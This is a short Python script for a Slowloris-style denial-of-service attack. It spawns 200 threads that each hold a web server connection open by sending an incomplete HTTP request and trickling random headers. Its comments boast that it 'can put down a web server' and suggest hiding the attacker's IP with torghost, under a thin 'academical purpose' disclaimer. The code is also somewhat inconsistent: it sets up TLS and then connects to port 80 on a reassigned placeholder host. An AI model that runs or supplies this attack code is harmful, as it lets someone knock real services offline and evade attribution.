import subprocess
import socket, ssl
import random
import time
import threading

# this attack really work and can put down a web server!
# pay attention, use it only for academical purpose

def attack():
    target_host = "www.my_site.it"
    target_port = 443  # create a socket object
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_sock = context.wrap_socket(client, server_hostname=target_host)

    # connect the client
    target_host = "www.this_is_not_a_real_website.com"
    target_port = 80
    s_sock.connect((target_host, target_port))
    request = "GET / HTTP/1.1\r\nHost:%s\r\n" % target_host
    s_sock.send(request.encode())
    while True:
        s_sock.send("X-a: {}\r\n".format(random.randint(1, 300)).encode())
        time.sleep(10)
    s_sock.close()

if __name__ == '__main__':

    # ! have a look to torghost to hide ip

    threads = list()
    for i in range(0, 200):
        print(i, ") sock opened")
        t = threading.Thread(target=attack)
        threads.append(t)
        t.start()

